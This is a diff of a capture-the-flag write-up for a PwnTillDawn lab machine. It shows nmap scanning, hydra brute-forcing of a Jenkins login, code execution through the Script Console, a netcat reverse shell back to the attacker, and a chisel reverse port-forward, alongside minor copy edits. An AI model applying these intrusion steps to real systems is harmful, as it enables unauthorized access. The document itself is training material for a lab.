@@ -1,4 +1,4 @@
-I"Y<p>This is a machine from the platform PwnTillDawn.</p>
+I"�Z<p>This is a machine from the platform PwnTillDawn.</p>
 
 <p>Check the platform by yourself and happy hacking:</p>
 
@@ -14,11 +14,13 @@
   <p>Rated as: Medium</p>
 
   <p>IP: 10.150.150.38</p>
+
+  <p>Goal: Become root and capture 4 flags: FLAG69.txt, FLAG70.txt, FLAG71.txt, and FLAG72.txt.</p>
 </blockquote>
 
 <h1 id="manual-os-fingerprinting"><a href="#header-1"></a>Manual OS fingerprinting.</h1>
 
-<p>I pinged the machine, and based on the <a href="https://subinsb.com/default-device-ttl-values/">TTL</a> I can conclude it’s a Linux box:</p>
+<p>Pinging the machine and based on the <a href="https://subinsb.com/default-device-ttl-values/">TTL</a> I can conclude it’s a Linux box:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 └─<span class="nv">$ </span>ping <span class="nt">-c</span> 1 10.150.150.38
@@ -32,8 +34,8 @@ rtt min/avg/max/mdev <span class="o">=</span> 162.577/162.577/162.577/0.000 ms
 
 <h1 id="port-scanning"><a href="#header-1"></a>Port scanning.</h1>
 
-<p>I use two port scans, in the first one I discover all open ports. In the second I perform a nmap scan over those 
-discovered ports trying to discover the service versions and also try basic nmap enum scripts.</p>
+<p>I use two port scans, in the first one I discover all open ports. In the second I perform a scan over those 
+discovered ports trying to discover the service versions and also try basic Nmap enum scripts.</p>
 
 <h2 id="first-scan"><a href="#header-2"></a>First scan.</h2>
 
@@ -53,20 +55,20 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 </code></pre></div></div>
 
 <ul>
-  <li>In the first part I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.</li>
+  <li>In the first part, I declare the IP of the machine as an env variable, because it reduces me time when doing the scans.</li>
   <li><code class="language-plaintext highlighter-rouge">-p-</code>: Scan all TCP ports.</li>
   <li><code class="language-plaintext highlighter-rouge">--min-rate=5000</code>: I want to go fast, remember this is a controlled environment, not recommended in corporate environments.</li>
   <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t use DNS resolution (It goes faster this way).</li>
-  <li><code class="language-plaintext highlighter-rouge">-sT</code>: Use tcp connect scan. I prefer this rather than the default (stealth).</li>
-  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery on the machine, it can save me some time, but before the scan I always test reachability to the machine.</li>
-  <li><code class="language-plaintext highlighter-rouge">-oG allports</code>: Saves the nmap output in grepable format to a file called <strong>allports</strong>.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sT</code>: Use TCP connect scan. I prefer this rather than the default (stealth).</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery on the machine, it can save me some time. Before the scan I always test reachability to the machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oG allports</code>: Saves the Nmap output in grepable format to a file called <strong>allports</strong>.</li>
   <li><code class="language-plaintext highlighter-rouge">--open</code>: Only shows me open ports.</li>
-  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is where i call my env variable the IP of the machine.</li>
+  <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is where I call my env variable the IP of the machine.</li>
 </ul>
 
 <p>When I’m facing some fancy bash commands that at first sight I don’t clearly understand there is a very useful resource (Thanks Henry): <a href="https://explainshell.com/explain?cmd=IP%3D10.150.150.38%3Bnmap+-p-+--min-rate%3D5000+-n+-sT+-Pn+-oG+allports+--open+%24IP">https://explainshell.com/</a></p>
 
-<p>Remember I saved the output as nmap grepable format? Well that was because I use a bash function that extracts the open ports from there and place them in a bash env variable called ports. Thanks to <a href="https://www.youtube.com/c/s4vitar/videos">s4vitar</a> for this:</p>
+<p>Remember I saved the output as nmap grepable format? Well, that was because I use a bash function that extracts the open ports from there and placed them in a bash env variable called ports. Thanks to <a href="https://www.youtube.com/c/s4vitar/videos">s4vitar</a> for this:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span>extract <span class="o">()</span> <span class="o">{</span>
         <span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span>/ | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span>| <span class="nb">sed</span> <span class="s1">'s/.$//'</span> <span class="si">)</span><span class="s2">"</span>
@@ -76,7 +78,7 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 
 </code></pre></div></div>
 
-<p>After writting that function in the .zshrc file (this is my case, because I’m using zsh), and using the source command to reaload the config, this is the output:</p>
+<p>After writing that function in my .zshrc file and using the source command to reload the config, this is the output:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>extract allports                                                                   
 Open ports:  22,30609
@@ -110,11 +112,11 @@ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up
 <ul>
   <li><code class="language-plaintext highlighter-rouge">-p$ports</code>: Only scan the ports I discovered from the previous scan.</li>
   <li><code class="language-plaintext highlighter-rouge">--min-rate=1000</code>: Fast scan.</li>
-  <li><code class="language-plaintext highlighter-rouge">-sC</code>: Perform nmap default scripts scan.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sC</code>: Perform Nmap default scripts scan.</li>
   <li><code class="language-plaintext highlighter-rouge">-sV</code>: Do version detection.</li>
   <li><code class="language-plaintext highlighter-rouge">-n</code>: Don’t do DNS resolution.</li>
   <li><code class="language-plaintext highlighter-rouge">-Pn</code>: Don’t do host discovery.</li>
-  <li><code class="language-plaintext highlighter-rouge">-oN targeted</code>: Save the output to a file called targeted, using normal format.</li>
+  <li><code class="language-plaintext highlighter-rouge">-oN targeted</code>: Save the output to a file called targeted, using the normal format.</li>
   <li><code class="language-plaintext highlighter-rouge">$IP</code>: This is the variable containing the IP.</li>
 </ul>
 
@@ -134,7 +136,7 @@ Shellcodes: No Results
 Papers: No Results
 </code></pre></div></div>
 
-<p>Nothing useful found here.</p>
+<p>Nothing useful was found here.</p>
 
 <h1 id="jenkins-login-page"><a href="#header-1"></a>Jenkins login page.</h1>
 
@@ -142,7 +144,7 @@ Papers: No Results
 
 <p><img src="assets/jenkins_login.png" alt="" /></p>
 
-<p>I <a href="https://www.shellhacks.com/jenkins-default-password-username/">found</a> that the default jenkins username is <code class="language-plaintext highlighter-rouge">admin</code>, and after trying default easy passwords 
+<p>I <a href="https://www.shellhacks.com/jenkins-default-password-username/">found</a> that the default Jenkins username is <code class="language-plaintext highlighter-rouge">admin</code>, and after trying default easy passwords 
 unsuccessfully I moved on and try to bruteforce the login page with <code class="language-plaintext highlighter-rouge">hydra</code>.</p>
 
 <h1 id="login-bruteforcing"><a href="#header-1"></a>Login bruteforcing.</h1>
@@ -172,7 +174,7 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 
 <h1 id="jenkins-code-execution"><a href="#header-1"></a>Jenkins code execution.</h1>
 
-<p>In the Script Console we can execute java code, and we can use it to execute system commands:</p>
+<p>In the Script Console page we can execute Java code, and we can use it to execute system commands:</p>
 
 <p><img src="assets/jenkins_execution.png" alt="" /></p>
 
@@ -184,7 +186,7 @@ Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span cl
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 6969
 listening on <span class="o">[</span>any] 6969 ...
-connect to <span class="o">[</span>10.66.67.166] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.38] 58262
+connect to <span class="o">[</span>10.66.69.69] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.150.150.38] 58262
 <span class="nb">whoami
 </span>jenkins
 </code></pre></div></div>
@@ -217,10 +219,10 @@ Active Internet connections <span class="o">(</span>servers and established<span
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 127.0.0.1:8080          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
 tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
-tcp        0    286 10.150.150.38:58264     10.66.67.166:6969       ESTABLISHED 636/bash            
+tcp        0    286 10.150.150.38:58264     10.66.69.69:6969       ESTABLISHED 636/bash            
 tcp6       0      0 :::30609                :::<span class="k">*</span>                    LISTEN      467/java            
 tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -                   
-tcp6       1      0 10.150.150.38:30609     10.66.67.166:48350      CLOSE_WAIT  467/java
+tcp6       1      0 10.150.150.38:30609     10.66.69.69:48350      CLOSE_WAIT  467/java
 </code></pre></div></div>
 
 <h1 id="port-forwarding"><a href="header-1"></a>Port forwarding.</h1>
@@ -249,7 +251,7 @@ jenkins@dev1:/tmp<span class="err">$</span>
 2021/09/08 21:49:35 server: Listening on http://0.0.0.0:7171
 </code></pre></div></div>
 
-<p>And then wer fire it up as client mode on the victim machine:</p>
+<p>And then we fire it up as client mode on the victim machine:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jenkins@dev1:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x chisel<span class="p">;</span>./chisel client 10.66.69.69:7171 R:8080:127.0.0.1:8080
 2020/07/29 11:10:24 client: Connecting to ws://10.66.69.69:7171
@@ -294,7 +296,7 @@ jenkins@dev1:/tmp<span class="err">$</span>
 
 </code></pre></div></div>
 
-<p>And whit that we got the third flag:</p>
+<p>And with that we got the third flag:</p>
 
 <p><img src="assets/FLAG71.png" alt="" /></p>
 
@@ -314,9 +316,18 @@ jenkins@dev1:/tmp<span class="err">$</span>
 
 <p>And that was it.</p>
 
+<h1 id="skills-used"><a href="header-1"></a>Skills used.</h1>
+
+<ul>
+  <li>Port enumeration with <code class="language-plaintext highlighter-rouge">nmap</code>.</li>
+  <li>Login form bruteforcing with <code class="language-plaintext highlighter-rouge">hydra</code>.</li>
+  <li>Jenkins code execution.</li>
+  <li>Port forwarding with <code class="language-plaintext highlighter-rouge">chisel</code>.</li>
+  <li>Python webapp command injection.</li>
+</ul>
+
 <h1 id="final-thoughts"><a href="header-1"></a>Final thoughts.</h1>
 
-<p>Was not a very difficult machine, however the last part of the command injection was hard for me, I had to try different combination of payloads until I finally got the good one.
-Was a very complete machine which involved bruteforcing techniques, command execution in jenkins, port forwarding and python code injection.</p>
-
+<p>It was not a very difficult machine, I spent a lot of fun while doing it even though the last part of the command injection was hard for me, 
+I had to try different combination of payloads until I finally got the good one.</p>
 :ET
